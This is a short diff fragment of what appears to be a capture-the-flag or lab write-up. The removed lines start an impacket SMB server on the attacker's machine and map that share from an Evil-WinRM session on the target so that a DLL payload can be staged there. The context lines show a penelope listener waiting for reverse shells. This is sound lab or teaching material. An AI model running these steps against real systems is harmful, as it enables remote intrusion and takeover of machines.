@@ -292,20 +292,6 @@ Saved as: reverse.dll
 Ill generate a payload
 
 ```python
-sudo impacket-smbserver share $(pwd) -smb2support -username hacker -password hackme
-[sudo] password for kali: 
-Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
-```
-This has started an SMB server on my machine
-
-```python
-*Evil-WinRM* PS C:\Temp> net use Z: \\10.10.14.90\share /user:hacker hackme
-The command completed successfully.
-
-
-```
-
-```python
 penelope -p 1337                                     
 [+] Listening for reverse shells on 0.0.0.0:1337 -> 127.0.0.1 • 192.168.1.157 • 10.10.14.90
 ➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
